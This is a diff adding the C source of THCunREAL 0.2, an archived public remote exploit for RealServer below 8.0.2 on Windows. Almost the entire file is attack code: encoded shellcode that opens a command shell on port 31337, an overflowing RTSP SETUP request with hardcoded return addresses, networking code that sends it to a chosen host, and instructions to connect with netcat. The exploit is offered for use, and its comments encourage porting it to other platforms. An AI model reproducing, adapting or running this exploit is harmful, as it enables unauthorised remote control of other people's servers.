@@ -1,0 +1,151 @@
+/*************************************************************/
+/* THCunREAL 0.2 - Wind0wZ remote root exploit                                    */
+/* Exploit by: Johnny Cyberpunk (jcyberpunk@thehackerschoice.com)        */
+/* THC PUBLIC SOURCE MATERIALS                                                       */
+/*                                                                                                      */
+/*                                                                                                      */
+/* This is the much more reliable version of the Realserver < 8.0.2 exploit */
+/* Tested with different OSes and Realserver Versions                              */
+/*                                                                                                      */
+/* While probing lot's of boxes via 'OPTIONS / RTSP/1.0' on TCP port 554  */
+/* i noticed that 99% of the probed machines are not up2date yet ! =;O)   */
+/*                                                                                                      */
+/* The shellcode is much shorter than the one in version 0.1 now and of    */
+/* course offsetless ! The encoder in front of the exploit is needed coz the */
+/* shellcode has next to 0x00,0x0d,0x0a also to be 0x20 and 0xff free !   */
+/*                                                                                                      */
+/* After successful exploitation  a commandshell should spawn on             */
+/* TCP port 31337 ! Use netcat to connect to this port !                            */
+/*                                                                                                      */
+/* If there's no connectable port 31337, maybe it's blocked by a firewall !  */
+/*                                                                                                      */
+/* Unfortunately i hadn't a Linux/Sparc or whatever Platform Realserver 8   */
+/* runs on. I just know it's also exploitable on other OSs !                        */
+/* So if u wanna exploit other platforms, try to get Realserver 8 and use    */
+/* gdb to find out, how this can be exploited ! Good luck !                        */
+/*                                                                                                      */
+/* compile with MS Visual C++ : cl THCunREAL.c /link ws2_32.lib                */
+/*                                                                                                      */ 
+/************************************************************/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <winsock2.h>
+
+char w32portshell[] =
+"\x8b\xfa\x33\xc9\xb2\x35\x90\x90\x90\x66\x81\xc1\x38\x01\x83"
+"\xc7\x1a\x8a\x1f\x32\xda\x88\x1f\x47\xe2\xf7\xde\x16\x4f\x5c"
+"\x37\x30\x59\x6c\xcd\x28\xa9\xeb\xb9\xe4\x79\x45\xe1\x36\xc5"
+"\x12\x15\x15\x05\x3d\x62\x66\x07\x6a\x06\x07\x1b\x71\x79\x79"
+"\x34\xde\x30\xdd\xcc\xca\xca\xca\x68\xb6\xd8\x1f\x5f\x05\x6c"
+"\x51\xbe\x34\xbe\x75\x39\xbe\x45\x29\x98\xbe\x4d\x3d\xb8\x6a"
+"\x09\xbe\x2e\x34\xce\xbe\x6e\x4d\x34\xce\xbe\x7e\x29\x34\xcc"
+"\xbe\x66\x11\x34\xcf\x66\x64\x67\xbe\x6e\x15\x34\xce\x04\xfc"
+"\x74\x04\xf5\xac\xbe\x01\xbe\x34\xcb\x99\x04\xf7\xe4\xd7\xb1"
+"\xf5\x40\xc2\x3a\x83\x70\x30\xb8\x71\x70\x31\x53\x0c\x25\x40"
+"\xd4\x53\x04\x25\x6f\x6d\x6b\x63\x65\x67\x1e\x7b\x25\x74\x3a"
+"\x82\x39\x7f\xbe\x31\xbd\x34\xcd\x3a\x83\x78\x30\xbc\x71\xb8"
+"\xed\xcb\x78\x30\x40\x8b\xcb\x78\x31\x41\x14\xcb\x78\x17\xb8"
+"\x68\x2d\x66\xca\xe5\xbc\xf2\x5f\x31\x6d\xbd\x70\x30\xb5\x70"
+"\x42\x3f\xb8\x68\x41\xb5\x5e\x13\x21\xdc\x4d\xca\xca\xca\xbc"
+"\xfb\x04\xee\x66\x66\x66\x66\x63\x73\x63\xca\xe5\xa2\x60\x6d"
+"\x53\xbc\x05\x5f\x25\x60\x62\xca\x60\xe1\x7b\x63\x62\xca\x60"
+"\xf9\x66\x60\x62\xca\x60\xe5\xa2\xb8\x70\xbd\x65\xca\x60\xd1"
+"\x60\x60\xca\x60\xdd\xb8\x71\x30\x39\xa1\x66\x5d\x1b\x50\x4d"
+"\x50\x5d\x69\x56\x58\x51\xa1\x04\xe7\xb8\x70\xf9\xa1\x62\x62"
+"\x62\x66\x66\xcb\xf3\x34\xc7\x67\xa1\xb8\x70\x4d\x65\xb8\x70"
+"\xbd\x65\x84\x3d\x66\x66\x5f\x25\xcb\xfb\x67\x66\x66\x66\x60"
+"\xca\x60\xd9\x5f\xca\xca\x60\xd5";
+
+void usage();
+
+int main(int argc, char *argv[])
+{ 
+unsigned short realport=554;
+unsigned int sock,addr,i,rc;
+unsigned char exploit_buffer[4132];
+unsigned long retloc1,retloc2,retaddr;
+struct sockaddr_in mytcp;
+struct hostent * hp;
+WSADATA wsaData;
+
+printf("\nTHCunREAL v0.2 - Wind0wZ remote root sploit for Realserver < 8.0.2\n");
+printf("by Johnny Cyberpunk (jcyberpunk@thehackerschoice.com)\n");
+
+if(argc<2)
+usage();
+
+retloc1 = 0x6235108c; 
+retloc2 = 0x623514b6;
+retaddr = 0x62354f5e;
+
+memset(exploit_buffer,'Z',4131);
+memcpy(exploit_buffer,"SETUP /",7);
+*(unsigned long *)&exploit_buffer[4082] = retloc1;
+*(unsigned long *)&exploit_buffer[4086] = retloc2;
+memcpy(&exploit_buffer[7],w32portshell,strlen(w32portshell));
+*(unsigned long *)&exploit_buffer[4090] = retaddr;
+memcpy(&exploit_buffer[4094],"\x83\xc2\x19\x52\xc3",5);
+memcpy(&exploit_buffer[4099]," RTSP/1.0\r\nTransport: THCr0x!\r\n\r\n",33);
+
+if (WSAStartup(MAKEWORD(2,1),&wsaData) != 0)
+{
+printf("WSAStartup failed !\n");
+exit(-1);
+}
+
+hp = gethostbyname(argv[1]);
+
+if (!hp){
+addr = inet_addr(argv[1]);
+}
+if ((!hp) && (addr == INADDR_NONE) )
+{
+printf("Unable to resolve %s\n",argv[1]);
+exit(-1);
+}
+
+sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+if (!sock)
+{ 
+printf("socket() error...\n");
+exit(-1);
+}
+
+if (hp != NULL)
+memcpy(&(mytcp.sin_addr),hp->h_addr,hp->h_length);
+else
+mytcp.sin_addr.s_addr = addr;
+
+if (hp)
+mytcp.sin_family = hp->h_addrtype;
+else
+mytcp.sin_family = AF_INET;
+
+mytcp.sin_port=htons(realport);
+
+rc=connect(sock, (struct sockaddr *) &mytcp, sizeof (struct sockaddr_in));
+if(rc==0)
+{
+send(sock,exploit_buffer,4131,0);
+printf("\nexploit send .... sleeping a while ....\n");
+Sleep(1000);
+printf("\nok ... now try to connect to port 31337 via netcat !\n");
+}
+else
+printf("can't connect to realserver port!\n");
+
+shutdown(sock,1);
+closesocket(sock);
+exit(0);
+}
+
+void usage()
+{
+printf("\nUsage: <Host>\n");
+exit(0);
+}
+
+
+// milw0rm.com [2003-04-30]
